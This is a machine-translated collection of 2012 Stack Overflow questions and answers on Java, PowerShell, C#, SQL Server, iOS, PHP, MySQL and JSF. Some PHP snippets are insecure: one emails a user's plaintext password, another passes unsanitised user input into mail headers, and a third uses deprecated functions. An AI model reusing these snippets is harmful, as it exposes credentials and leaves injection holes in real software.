[http://codex.wordpress.org/Designing_Headers](http://codex.wordpress.org/Designing_Headers)

# java - 我不能再在 netbeans 中启动 javadb

> ID：12954057
> 
> 赞同：0
> 
> 时间：2012-10-18T11:56:58.763
> 
> 标签：java, javadb

```
Exception in thread "main" java.lang.NoClassDefFoundError:
org/apache/derby/drda/NetworkServerControl Caused by:
java.lang.ClassNotFoundException:
org.apache.derby.drda.NetworkServerControl
    at java.net.URLClassLoader$1.run(URLClassLoader.java:202)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:247) 
```

此外netbeans找不到

```
import javax.persistence.*; 
```

# winapi - SetForegroundWindow、AllowSetForegroundWindow & LockSetForegroundWindow

> ID：12954077
> 
> 赞同：1
> 
> 时间：2012-10-18T11:58:19.233
> 
> 标签：winapi, powershell, powershell-2.0

使用 powershell 代码，我尝试更改窗口的位置（正常工作）并将此窗口“始终位于顶部”。

请在下面找到我的代码：

```
Import-Module C:/install/WASP/wasp.dll

Add-Type @"
  using System;
  using System.Runtime.InteropServices;
  public class SFW {
     [DllImport("user32.dll")]
     [return: MarshalAs(UnmanagedType.Bool)]
     public static extern bool SetForegroundWindow(IntPtr hWnd);
  }
"@

Add-Type @"
  using System;
  using System.Runtime.InteropServices;
  public class Tricks {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
}
"@

Add-Type @"
  using System;
  using System.Runtime.InteropServices;
  public class allowFor {
    [DllImport("user32.dll")]
     [return: MarshalAs(UnmanagedType.Bool)]
     public static extern bool AllowSetForegroundWindow(IntPtr hWnd);
}
"@

Add-Type @"
  using System;
  using System.Runtime.InteropServices;
  public class lockFor {
    [DllImport("user32.dll")]
     [return: MarshalAs(UnmanagedType.Bool)]
     public static extern bool LockSetForegroundWindow(IntPtr hWnd);
}
"@

do
{
    Start-Sleep -m 3000
    $allWindow = Select-Window Perso*
    if($allWindow)
    {
        foreach ($currentWindow in $allWindow) 
        {
            $positionWindow = WindowPosition $currentWindow
            foreach ($currentPosition in $positionWindow) 
            {
                #Loop on each windows
                if ( $currentWindow.title -match "\([0-9]*\)#" )
                {
                    # Retrieve windows ID
                    $id = $currentWindow.title.Substring($currentWindow.title.IndexOf("(")+1, $currentWindow.title.IndexOf(")")-$currentWindow.title.IndexOf("(")-1)
                    $allHUDWindow = Select-Window * | where {$_.Title -match "\($id\).*.txt"}

                    if($allHUDWindow)
                    {
                        foreach ($currentHUDWindow in $allHUDWindow) 
                        {
                            $currentForgr = [Tricks]::GetForegroundWindow()
                            if ( ($currentForgr -match $currentWindow.Handle -or  $currentForgr -match $currentHUDWindow.Handle) )
                            {
                                write-host "Pus currentHUDWindow in Front"

                                $hud =  (get-process -Id $currentHUDWindow.ProcessId).MainWindowHandle

                                [allowFor]::AllowSetForegroundWindow(-1)
                                [SFW]::SetForegroundWindow($hud)

                                #Modification de la position
                                Set-WindowPosition -X ($currentPosition.x-10) -Y ($currentPosition.y-30) -WIDTH ($currentPosition.width+20) -HEIGHT ($currentPosition.height+30) -Window $currentHUDWindow          
                            }
                        }
                    }
                }
            }
        }
    }
} while(1) 
```

但 ：

```
 [allowFor]::AllowSetForegroundWindow(-1)
                                [SFW]::SetForegroundWindow($hud) 
```

还我假。

从文档中：

```
An application cannot force a window to the foreground while the user is working with another window. Instead, Windows flashes the taskbar button of the window to notify the user. 
```

你知道我怎样才能强制 $currentHUDWindow 向前移动吗？而且不只闪烁任务栏按钮？

谢谢你的帮助

# c# - 使用 C#.Net 在 Windows 窗体应用程序中的弹出窗口上显示后台任务的进度

> ID：12954078
> 
> 赞同：2
> 
> 时间：2012-10-18T11:58:21.967
> 
> 标签：c#, .net, winforms

我在后台使用 xml 数据创建一些文件

```
Task.Factory.StartNew(() => xmlconvert(xx, yy)); 
```

现在，问题是如何使用带有一些消息和进度的 StatusStrip 控件或至少只是进度的滚动动画来显示此方法的进度。我不知道它是如何工作的。

更新：首先，这个方法'xmlconvert（xx，yy）'有四种不同的形式，取决于用户在运行时选择的条件。在我的应用程序的主窗体中，用户可以从不同的条件中选择对数据进行处理。最后，当用户单击“创建”按钮时，所有这些条件都将被检查，并且将在该按钮单击事件中调用合适的方法。我需要显示在运行时调用的此方法的进度。

```
private void btnCreateRelease_Click(object sender, EventArgs e)
{
      // Checks set of conditions

      if(cond 1)
      {
          xmlconvert_1();
      }
      else if (cond2)
      {
          xmlconvert_2();
      }
      else if (cond3)
      {
          xmlconvert_3();
      }
      else if (cond4)
      {
          xmlconvert_4();
      }
} 
```

我想显示将在运行时调用的这些方法之一的进度取决于条件。

非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:08:53.637

您可以为此使用 BackgroundWorker，它也非常简单。这里有一个样本可以帮助你：

```
public partial class Form1 : Form
{
    public Form1()
    {
        InitializeComponent();

        backgroundWorker1.WorkerReportsProgress = true;
        backgroundWorker1.DoWork += new DoWorkEventHandler(backgroundWorker1_DoWork);
        backgroundWorker1.ProgressChanged += new ProgressChangedEventHandler(backgroundWorker1_ProgressChanged);
    }

    void Form1_Shown(object sender, EventArgs e)
    {
        backgroundWorker1.RunWorkerAsync();
    }

    void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
    {
        // Do your work in here.
        xmlconvert(xx, yy);

        for (int i = 0; i <= 100; i++)
        {
            backgroundWorker1.ReportProgress(i);
            System.Threading.Thread.Sleep(100);
        }
    }

    void backgroundWorker1_ProgressChanged(object sender, ProgressChangedEventArgs e)
    {
        progressBar1.Value = e.ProgressPercentage;
    }
} 
```

这是[文档](http://msdn.microsoft.com/en-us/library/cc221403%28v=vs.95%29.aspx)的链接。

为了让它在你的场景中工作，我建议你在你的 StatusStrip 控件中添加一个进度条并从`backgroundWorker1_ProgressChanged`事件中更新它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:47:33.240

如果您只想显示，您的应用未挂起可能有助于以下方法：

```
public static class ActionExtensions
{
    public static void RunWithMargueProgress(this Action action)
    {           
        var progressForm = new ProgressForm();

        progressForm.Show();
        Task.Factory.StartNew(action)
            .ContinueWith(t =>
                              {
                                  progressForm.Close();
                                  progressForm.Dispose();
                              }, TaskScheduler.FromCurrentSynchronizationContext());            
    }
} 
```

Where`ProgressForm`将是一个简单的表单`ProgressBar`，即设置为`Marquee`样式。如果您有想法，它是如何进展的，最好为用户和使用显示进度`BackgroundWorker`。

只要它的参数是`Action`，它就很容易重复使用。

用法是：

```
private void button_Click(object sender, EventArgs e)
{
    Action action = () => Thread.Sleep(5000);
    action.RunWithMargueProgress();          
} 
```

如果您在状态栏中有控制权，您希望制作动画，您可以这样做：

```
public static void RunWithMargueProgress(this Action action, ToolStripProgressBar progressBar)
{
    progressBar.Style = ProgressBarStyle.Marquee;            
    progressBar.MarqueeAnimationSpeed = 30;

    Task.Factory.StartNew(action)
        .ContinueWith(t =>
                           {
                               progressBar.MarqueeAnimationSpeed = 0;
                               progressBar.Style = ProgressBarStyle.Continuous;                                      
                           }, TaskScheduler.FromCurrentSynchronizationContext());
} 
```

用法几乎相同：

```
private void button_Click(object sender, EventArgs e)
{
    Action action = () => Thread.Sleep(5000);
    action.RunWithMargueProgress(ToolStripProgressBar);          
} 
```

# sql - 列名无效：SQL Server 2008 R2

> ID：12954082
> 
> 赞同：0
> 
> 时间：2012-10-18T11:58:26.783
> 
> 标签：sql, sql-server, sql-server-2008, tsql

我有一个存储过程，用于从 SQL 表中提取二进制数据以创建物理文件。我已经在从 SQL 备份恢复的具有相同结构的表上使用了它几次，它工作正常。

今天我想从恢复备份中的新表中提取一些二进制数据。我打开了我一直在使用的存储过程并着手修改代码。一旦我对更改感到满意，我就会尝试执行“ALTER”语句。不幸的是，尽管存在于“文档”表中，但我使用的两个列名都是“无效的”。

我已经阅读了许多关于“无效列名”错误的其他线程，但其中大多数似乎是输入错误。我已经检查了我的列名无数次（智能甚至让我输入'Document.Document_ID'和'Document.Document_Filename'，但它们仍然失败）。

有什么想法我哪里出错了吗？

资源：

```
USE [Example Live]
GO
/****** Object:  StoredProcedure [dbo].[FileExport]    Script Date: 10/18/2012 11:42:14 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
-- =============================================
-- Author:      Chris Murray
-- Create date: 18/10/2012
-- Description: Exports binary file data
-- =============================================
ALTER PROCEDURE [dbo].[FileExport] 
-- Add the parameters for the stored procedure here
@OutputFilePath VARCHAR(500) = 'C:\Conv\Example\In\Afiles\'
AS
BEGIN

   DECLARE @totrow int
   DECLARE @currow int
   DECLARE @result int
   DECLARE @nsql nvarchar(4000)

   DECLARE @sqlStatements table (ID int IDENTITY(1, 1),  SqlStatement varchar(max))   

   INSERT
   INTO @sqlStatements
   SELECT 'BCP "SELECT Document_Data FROM [Example Live].[dbo].[Document] WHERE Document_ID = '''
  + CAST(Document_ID AS VARCHAR(500)) + '''" queryout ' + @OutputFilePath 
  + CAST(Document_Filename AS VARCHAR(500)) + ' -S localhost\SQLEXPRESS2008 -T -f C:\Conv\Example\In\AFiles\Images.fmt'
   FROM dbo.Photograph  

   SET @totrow = @@ROWCOUNT
   SET @currow = 1
   WHILE @totrow > 0 and @currow <= @totrow
   BEGIN
      SELECT @nsql = SqlStatement
      FROM @sqlStatements
      WHERE ID = @currow
      EXEC @result = xp_cmdshell @nsql
      SET @currow = @currow + 1
   END
END 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T13:15:39.350

感谢大家的想法。

这个问题是我自己造成的，而且是一个菜鸟的错误。我忽略了将 SELECT 语句指向正确的表..

# sql - SQL FORCE SORT 按包含的值从行生成的列

> ID：12954086
> 
> 赞同：2
> 
> 时间：2012-10-18T11:58:37.097
> 
> 标签：sql, sql-server, tsql

我需要对动态查询的输出进行排序，将列转换为行，以确保在没有值的行之前只生成具有值的列。如何强制生成列的顺序，以便第一列是包含特定字段值的列，而那些没有特定字段值的列是在我的行尾生成的？

```
 insert into #PriceSheet
      select  ID, ProductID,SheetNumber ,SheetDesc ,MfgPriceCode,PriceZone

  FROM  ProductPrice
  left join UNITS On SUOM = UOMID

  select @colsUnpivot = stuff((select ','+quotename(C.name)
         from tempdb.sys.columns as C
         where C.object_id = object_id('tempdb..#PricingSheet') and
               C.name LIKE '%%' 
         for xml path('')), 1, 1, '')

 select @colsPivot = STUFF((SELECT  ',' 
                      + quotename(c.name 
                         + cast(t.rn as varchar(10)))
                    from
                    (
                      select row_number() over(partition by ProductID 
                                               order by ProductID) rn
                      from #PriceSheet
                    ) t
                     cross apply 
                      tempdb.sys.columns  as C
                   where C.object_id = object_id('tempdb..#PricingSheet') 
                     and C.name Not in ('CreateDate', 'LastModifiedDate')
                   group by c.name, t.rn
                   order by t.rn
            FOR XML PATH(''), TYPE
            ).value('.', 'NVARCHAR(MAX)') 
        ,1,1,'')

       set @query = 'select *
      from
      (
        select ProductID, col + cast(rn as varchar(10)) new_col, val
        from 
        (
          select  
       cast(ProductID              as varchar(50))ProductID
      ,cast(SheetNumber              as varchar(50))SheetNumber
      ,cast(SheetDesc              as varchar(50))SheetDesc
      ,cast(MfgPriceCode              as varchar(50))MfgPriceCode
      ,cast(PriceZone              as varchar(50))PriceZone 
       row_number() over(partition by productid order by productid) rn

          from #PriceSheet
        ) x
        unpivot
        (
          val
          for col in ('+ @colsunpivot +')
        ) u
      ) x1
      pivot
      (
        max(val)
        for new_col in
          ('+ @colspivot +')
      ) p' 
```

比如说，首先为 SheetNumber 不等于 NULL 的行生成列，然后再为 NULLS 生成列。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-26T02:43:07.393

```
select *
      from
      (
        select ProductID,
            col + cast(rn as varchar(10)) new_col,
            val
        from 
        (
          select   
           Cast (ProductID as NVarchar(3072)) ProductID
           ,Cast (SheetNumber  as NVarchar(3072)) SheetNumber 
           ,Cast (SheetDesc   as NVarchar(3072)) SheetDesc 
           ,Cast (MfgPriceCode as NVarchar(3072)) MfgPriceCode
           ,Cast (PriceZone as NVarchar(3072))  PriceZone  
            ,row_number() over(partition by ProductID order by Case When SheetNumber Is Null Then 1 Else 0 End, ProductID) rn
          from MainPricesheet
     ) x
        unpivot
        (
          val
          for col in ([SheetNumber],[SheetDesc],[MfgPriceCode],[PriceZone])
        ) u
      ) x1
      pivot
      (
        max(val)
        for new_col in
          ([SheetNumber1],[SheetDesc1],[MfgPriceCode1],[PriceZone1],
           [SheetNumber2],[SheetDesc2],[MfgPriceCode2],[PriceZone2],
           [SheetNumber3],[SheetDesc3],[MfgPriceCode3],[PriceZone3],
           [SheetNumber4],[SheetDesc4],[MfgPriceCode4],[PriceZone4],
           [SheetNumber5],[SheetDesc5],[MfgPriceCode5],[PriceZone5],
           [SheetNumber6],[SheetDesc6],[MfgPriceCode6],[PriceZone6],
           [SheetNumber7],[SheetDesc7],[MfgPriceCode7],[PriceZone7],
           [SheetNumber8],[SheetDesc8],[MfgPriceCode8],[PriceZone8],
           [SheetNumber9],[SheetDesc9],[MfgPriceCode9],[PriceZone9],
           [SheetNumber10],[SheetDesc10],[MfgPriceCode10],[PriceZone10],
           [SheetNumber11],[SheetDesc11],[MfgPriceCode11],[PriceZone11],
           [SheetNumber12],[SheetDesc12],[MfgPriceCode12],[PriceZone12],
           [SheetNumber13],[SheetDesc13],[MfgPriceCode13],[PriceZone13],
           [SheetNumber14],[SheetDesc14],[MfgPriceCode14],[PriceZone14],
           [SheetNumber15],[SheetDesc15],[MfgPriceCode15],[PriceZone15],
           [SheetNumber16],[SheetDesc16],[MfgPriceCode16],[PriceZone16],
           [SheetNumber17],[SheetDesc17],[MfgPriceCode17],[PriceZone17],
           [SheetNumber18],[SheetDesc18],[MfgPriceCode18],[PriceZone18],
           [SheetNumber19],[SheetDesc19],[MfgPriceCode19],[PriceZone19],
           [SheetNumber20],[SheetDesc20],[MfgPriceCode20],[PriceZone20],
           [SheetNumber21],[SheetDesc21],[MfgPriceCode21],[PriceZone21])
      ) p 
```

# ios - iOS 6.0 限制导航控制器内的自动旋转？

> ID：12954087
> 
> 赞同：2
> 
> 时间：2012-10-18T11:58:44.847
> 
> 标签：ios, uiviewcontroller, uinavigationcontroller, uiinterfaceorientation, autorotate

我还应该做什么？

```
-(BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation) toInterfaceOrientation
{
    return (toInterfaceOrientation == UIInterfaceOrientationPortrait);
}

- (NSUInteger)supportedInterfaceOrientations
{
    return UIInterfaceOrientationMaskPortrait;
}

-(BOOL)shouldAutoRotate
{
    return NO;
} 
```

我的 viewController 仍然旋转。

* * *

它嵌入在导航堆栈中。如果我将 UINavigationController 子类化，并在那里实现相同的仅纵向模板，并将我的 viewController 嵌入到经过调整的 navigationController 中，那么它就可以工作，但我无意在 UINavigationController 出现的任何地方重写我的代码。

这里的最佳做法是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-18T12:49:57.757

原始答案：无需子类化 - 只需像我在此处的解决方案中描述的那样做一个类别： [iOS6 模拟器中的顶部主页按钮纵向方向不起作用](https://stackoverflow.com/questions/12503658/top-home-button-portrait-orientation-in-ios6-simulator-not-working/12518577#12518577)

基本上，对于 iPhone，UINavigationController 允许旋转除“顶部主页按钮肖像”之外的所有内容，对于 iPad，它允许所有内容。

所以要么你做一个类别将决定转发给当前活动的视图控制器，要么像静态的东西

UINavigationController-Rotation.h：

```
@interface UINavigationController (Rotation)
@end 
```

UINavigationController-Rotation.m：

```
#import "UINavigationController-Rotation.h"

@implementation UINavigationController (Rotation)

#pragma From UINavigationController

- (BOOL)shouldAutorotate {

    return NO;
}

- (NSUInteger)supportedInterfaceOrientations {

    return UIInterfaceOrientationMaskPortrait;
}

#pragma -

@end 
```

更新：正如 Javier Soto 指出的那样，如果有第二个类别做同样的事情，这可能会导致未定义的行为。在这种情况下，子类化可能是更好的解决方案。

在您知道没有其他类别在做同样的事情的情况下，我仍然认为这是一个可行的、省力的、本地的和务实的解决方案。我对此并不虔诚。自己决定。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-07-11T20:23:36.853

您应该从任何地方继承`UINavigationController`并使用您的自定义。这不是很多工作（只需搜索`UINavigationController`代码中的出现）。这将变得更加灵活，因为您可以在必要时自定义其他内容。

**永远**不要像其他响应所暗示的那样在覆盖主类中的方法的类别中执行此操作。

# java - 获取流媒体视频的持续时间

> ID：12954090
> 
> 赞同：2
> 
> 时间：2012-10-18T11:59:02.180
> 
> 标签：java, android, video, media-player, media

我正在使用 VideoView，并且`setVideoUri`我正在使用流 url 的链接。在我能够使用的大多数设备中`getDuration`，它工作正常。但是使用 Samsumg Galaxy Tab，`getDuration`正在返回`0`，因此，我无法显示总时间，并且我的搜索栏搞砸了。

那么可以做些什么来获得持续时间呢？

我尝试了一些替代方案，例如 when `getCurrentPosition() > 0`，当视频数据从流 url 加载时，我再次调用`getDuration`，但仍然没有用。我得到 0 作为一个值。

# php - 通过 php mail() 函数发送邮件时无法换行

> ID：12954094
> 
> 赞同：1
> 
> 时间：2012-10-18T11:59:13.647
> 
> 标签：php, email

这是我的代码：

```
 $body = "Name:{$name}".PHP_EOL;
    $body .= "Phone:".$phone.PHP_EOL;
    $body .= "Email:".$email."\n\n";
    $body .= "Comments:".$comments."\n\n";
    $headers = 'From: MAILER <'.$emailTo.'>' . "\r\n" . 'Reply-To: '. $email."\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8"; 
    mail($emailTo, "New message", $body, $headers); 
```

如您所见，我尝试使用 \r\n\、\n\n、PHP_EOL 等...唯一有效的方法是删除“内容类型”标头。有人知道为什么会这样吗？！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:01:53.740

由于您要发送 HTML 电子邮件，因此您需要使用它`<br>` 来设置换行符。好吧，或者将所有内容包装在`<pre></pre>`标签中以纪念 \n。如果您在输出中不需要 HTML，只需将您的内容设置为`'text/plain'`，就会显示换行符。

由于它不是多部分，请尝试添加`MIME-Version: 1.0`到标题中。这可能有助于内容类型。

```
$headers .= "MIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8"; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:51:13.230

用作示例中的说明

```
$toemail=$emailid;
                $subject="You have registered successfully , please activate your account.";
                $msgbody.='<table width="100%" align="center" cellpadding="5" cellspacing="0" border="0">';
                $msgbody.='<tr><td>Admin Approved your profile and the details are : </td></tr>';
                $msgbody.='<tr><td>Username : '.$username.'</td></tr>';
                $msgbody.='<tr><td>Email : '.$emailid.'</td></tr>';
                $msgbody.='<tr><td>Password : '.$_SESSION['fan_user_password'].'</td></tr>';
                $msgbody.='<tr><td><a href="'.BASE_URL.'activate/fan/'.$lastid.'/'.$activation_code.'">';
                $msgbody.='Click here </a>to activate your account.</td></tr>';
                $msgbody.='</table>';
                mail($toemail,$subject,$msgbody,$from=''); 
```

# mysql - mysql DECLARE WHILE 外部存储过程如何？

> ID：12954095
> 
> 赞同：21
> 
> 时间：2012-10-18T11:59:26.110
> 
> 标签：mysql

我对 mysql 相当陌生，但有 MS SQL 经验。

是否可以在**存储过程之外****声明变量**并使用**while**语句？

 **我只找到了这样的例子

```
1\. procedure created
2\. execute proc
3\. drop proc 
```

建议我正确的方法

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-10-18T12:14:37.187

不，你不能这样做。您只能在 BEGIN...END 子句中使用这些语句。

因此，在存储过程/函数、触发器和事件中是可能的。

更多信息在这里 - [MySQL 复合语句语法](http://dev.mysql.com/doc/refman/5.5/en/sql-syntax-compound-statements.html)。**

# php - 使用php删除文件夹空间

> ID：12954097
> 
> 赞同：0
> 
> 时间：2012-10-18T11:59:30.080
> 
> 标签：php

我正在使用 php 上传 zip 文件，当我使用提取文件夹时，

```
$zip = new ZipArchive;
if ($zip->open("test.zip") === TRUE) {
$zip->extractTo($pat."/");
$zip->close();
} 
```

一切正常。但如果假设，上传的 zip 格式文件名是 ex（新文件夹），即名称之间的空格。我无法获得文件夹的名称。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T13:03:39.700

我找到了答案，

```
$var =$_FILES['Filedata']['name'];
$name= str_replace(" ","\ ",$var); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:08:53.377

如果不需要保留空格，您可以使用“ereg_replace”函数：

```
$var =$_FILES['Filedata']['name'];
$name= ereg_replace(" ","_",$var); 
```

所以“新文件夹”将变成“new_folder”。

# asp.net-mvc - .netMVC4 中的 willcascadeondelete 不起作用

> ID：12954104
> 
> 赞同：0
> 
> 时间：2012-10-18T11:59:53.573
> 
> 标签：asp.net-mvc, entity-framework, ado.net, ef-code-first

我正在创建 .net MVC4 应用程序。我有两个名为 group 和 groupmembers 的实体。组与组成员具有一对多的关系。这是我的课

```
public class Group
  { 
    public int GroupId{get;set;}
    public virtual ICollection<GroupMember> Members { get; set; }
  }

public class GroupMember
{
  public int GroupMemberId { get; set; }

    public int GroupId { get; set; }
    public virtual Group Group { get; set; }

    } 
```

在模型方面，我正在使用代码

```
 modelBuilder.Entity<GroupMember>()
          .HasRequired(e => e.Group)
            .WithMany()
            .HasForeignKey(e => e.GroupId)
           .WillCascadeOnDelete(); 
```

我的问题是在删除组时，组的成员没有被删除。任何人都可以给我一个解决方案

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-10-19T05:23:04.123

WillCascadeOnDelete() 告诉 EF 数据库将执行删除。EF 不执行级联，因此您需要更改表以添加删除。

您可以在 SSMS 设计器中通过打开关系为级联操作选择删除来执行此操作，也可以在 T-SQL 中执行此操作：

```
ALTER TABLE dbo.GroupMember DROP CONSTRAINT fkName
GO
ALTER TABLE dbo.GroupMember ADD CONSTRAINT
fkName FOREIGN KEY (GroupId) 
REFERENCES dbo.Group (Id) ON DELETE CASCADE 
```

# c# - 比较属性不验证属性

> ID：12954106
> 
> 赞同：0
> 
> 时间：2012-10-18T11:59:58.730
> 
> 标签：c#, .net, asp.net-mvc, data-annotations

我尝试比较两个 TimeSpan 字段。下面的代码不起作用。此外，我删除 [DataType(DataType.Time)] 并尝试但没有任何成功。

```
 [Required(ErrorMessage = "Required start time")]
    [DataType(DataType.Time)]
    [Compare("EndTime", ErrorMessage = "Početak i kraj smjene moraju biti različiti.")]
    public System.TimeSpan StartTime { get; set; }

    [Required(ErrorMessage = "Required end time")]
    [DataType(DataType.Time)]
    public System.TimeSpan EndTime { get; set; } 
```

如何比较两个 TimeSpan 字段？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:08:09.590

比较验证值是否相同。你确定你希望开始时间和结束时间是相同的值吗？值是如何设置的？可能它们相差一两毫秒，因此不相等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T15:27:45.907

查看 FluentValidation，我看到了这个并且效果很好。

[http://fluentvalidation.codeplex.com/](http://fluentvalidation.codeplex.com/)

# codeigniter - 调用未定义函数 result()

> ID：12954108
> 
> 赞同：1
> 
> 时间：2012-10-18T12:00:04.773
> 
> 标签：codeigniter

我在我的视图文件中收到此错误。这是我的代码，请帮帮我并告诉我该怎么做？

```
<?php 
//foreach($records->result() as $row):
foreach(result() as $row):
 echo $row->title;
endforeach;
?> 
```

这是我的控制器文件：

```
 <?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Hello extends CI_Controller
{
    public function index()
    {
        $this->load->model('hello_model');
        $data['records']=$this->hello_model->getAll();
        $this->load->view('you_view',$data);
        //$this->load->view('you_view');
    }
}
?> 
```

我也在这里发布我的模型文件。我尝试了一些，但仍然出现此错误。Dnt 知道要做什么。

```
<?php

class Hello_model extends CI_Model
{
    function __construct()
    {
        // Call the Model constructor
        parent::__construct();
    }

    function getAll()
    {
    $q=$this->db->get('test'); // query where 'test' is table name.

        if($q->num_rows()>0)
        {
           foreach ($q->result() as $row)
           {
              $data[]=$row;
           }
        return $data;
        }
    }
}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:21:05.470

`$records`已经保存了您的数据，所以这应该可以工作：

```
foreach($records as $row){
    echo $row->title;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:02:54.880

您不需要在视图中使用 result()，因为在您的模型中您已经这样做了。

试试这个：

```
 <?php 
 foreach($records as $row):
 echo $row->title;
 endforeach;
 ?> 
```

# ajax - 在 jsf 中调用 jquery ajax 调用并用数据渲染表

> ID：12954109
> 
> 赞同：0
> 
> 时间：2012-10-18T12:00:09.527
> 
> 标签：ajax, jsf

我在 jsf 中使用这个 ajax 调用

```
jQuery.ajax({

    url: '#{UserBean.searchUser}',
    type: 'POST',
    data: { firstName: firstName },
    success: function(data) {
        // render table
    },
    error: function(request, status, error) {
        //error description
    },
}); 
```

在这里我获得了成功，这意味着该动作被调用。我想从操作中检索用户列表，如何从操作中发送列表？返回数据后，我想渲染表中的所有数据，格式为：

```
<h:dataTable 
    var="o"
    id="tblResult" 
    cellpadding="10px" 
    cellspacing="0px" 
    styleClass="searchTable">

    <h:column>
        <f:facet name="header">
        <h:outputText value="Student Name" />
    </f:facet> 
        <h:outputText value="User1" />
    </h:column>

    <h:column>
        <f:facet name="header">
            <h:outputText value="Student Id" />
        </f:facet>
            <h:outputText value="user1" />
    </h:column>
</h:dataTable> 
```

我无法使用

```
<f:ajax /> 
```

因为我的页面是.jsp。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-19T11:34:22.333

如果您已经在问这个问题，这并不容易。

您基本上需要创建一个自定义 Ajax 感知[`ViewHandler`](http://docs.oracle.com/javaee/5/api/javax/faces/application/ViewHandler.html)以及一个自定义 XML[`ResponseWriter`](http://docs.oracle.com/javaee/5/api/javax/faces/context/ResponseWriter.html)和[自定义标记](http://docs.oracle.com/javaee/5/tutorial/doc/bnalj.html)，它们生成所需的 JavaScript 代码来执行`XMLHttpRequest`工作和 HTML DOM 操作。这也是大多数第 3 方 JSF 1.x 组件库已经为您完成的工作。它们都是开源的，所以你可以看看它的源代码，通过例子来学习他们是如何做到的。但这需要扎实的知识和对 HTTP、HTML、XMLHttpRequest 和 JSF 生命周期如何工作的理解。如果你已经在问这个问题......

我强烈建议只[从 JSP 迁移到 Facelets](https://stackoverflow.com/questions/4441713/migrating-from-jsf-1-2-to-jsf-2-0/4532870#4532870)。JSP 自 JSF 2.0 以来已被弃用，所有新的 JSF 2.0 标记/功能均不适用于 JSP，而仅适用于 Facelets。此外，所有与 JSF 2.0 兼容的组件库都不再支持 JSP。

### 也可以看看：

*   [从 JSF 1.2 迁移到 JSF 2.0](https://stackoverflow.com/questions/4441713/migrating-from-jsf-1-2-to-jsf-2-0)
*   [何时使用 <ui:include>、标记文件、复合组件和/或自定义组件？](https://stackoverflow.com/questions/6822000/when-to-use-uiinclude-tag-files-composite-components-and-or-custom-componen)

# spring - FKeditor 和 Spring MVC Maven 一步步集成

> ID：12954117
> 
> 赞同：1
> 
> 时间：2012-10-18T12:00:47.017
> 
> 标签：spring, fckeditor

我想在我的 spring mvc 中使用 Fckeditor。您能否提供逐步设置的说明或链接？

我执行了以下步骤，但是当我运行时，显示 404 not found [/springmvc/fckeditor/editor/fckeditor.html]。

你能检查我错在哪里并指导我吗？

首先，根据文档，我在 pom.xml 中添加了以下代码。

```
<dependency>
  <groupId>net.fckeditor</groupId>
  <artifactId>java-core</artifactId>
  <version>2.6</version>
</dependency> 
```

在 web.xml 文件中，我添加了以下代码。

```
<servlet>
      <servlet-name>ConnectorServlet</servlet-name>
        <servlet-class>
          net.fckeditor.connector.ConnectorServlet
      </servlet-class>
      <load-on-startup>1</load-on-startup>
</servlet>

<servlet-mapping>
  <servlet-name>ConnectorServlet</servlet-name>
  <url-pattern>
    /resources/fckeditor/editor/filemanager/connectors/*
  </url-pattern>
</servlet-mapping> 
```

之后我下载 FCKeditor_2.6.8.zip 文件并解压到 src/main/resources 文件夹中。

在jsp页面中，我添加了taglib、javascript和tag。

`<%@ taglib uri="http://java.fckeditor.net" prefix="FCK" %>`

> ```
> function FCKeditor_OnComplete(editorInstance) {
>   window.status = editorInstance.Description;
> } 
> ```

```
<FCK:editor instanceName="EditorDefault">
  <jsp:attribute name="value">This is some <strong>sample text
      </strong>. You are using <a href="http://www.fckeditor.net">
      FCKeditor</a>.
  </jsp:attribute>
</FCK:editor> 
```

但是 Fckeditor 仍然无法正常工作。

你能指导我哪个是错的吗？

谢谢，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T13:10:41.253

我用过ckeditor，下面是配置

```
 <dependency>
        <groupId>com.ckeditor</groupId>
        <artifactId>ckeditor-java-core</artifactId>
        <version>3.5.3</version>
    </dependency> 
```

在jsp文件中

```
<%@ taglib prefix="ckeditor" uri="http://ckeditor.com"%>
        <script type="text/javascript" src="%=request.getContextPath()%>/common/script/ckeditor/ckeditor.js"></script>
<form:textarea path="body" maxlength="5000" />                                                       <ckeditor:replace replace="body" basePath="../ckeditor/" /> 
```

确保你也复制js文件并复制它并在jsp中指定它

# ios - 如果委托不再存在会怎样？

> ID：12954118
> 
> 赞同：0
> 
> 时间：2012-10-18T12:00:50.883
> 
> 标签：ios, uiviewcontroller, delegates, crash, viewdidload

我在开发我的应用程序时遇到了一个有趣的问题。想象一下那里的风景

*   存在一个对象，我们称它为 A。
*   A，然后创建某个基于委托的类的对象（B），例如 NSURLConnection。
*   A 将自己分配为 B 的委托，前提是 A 已实现所有必需的委托方法。
*   A 要求 B 开始处理。在我们的示例中，即从某个服务器获取数据。
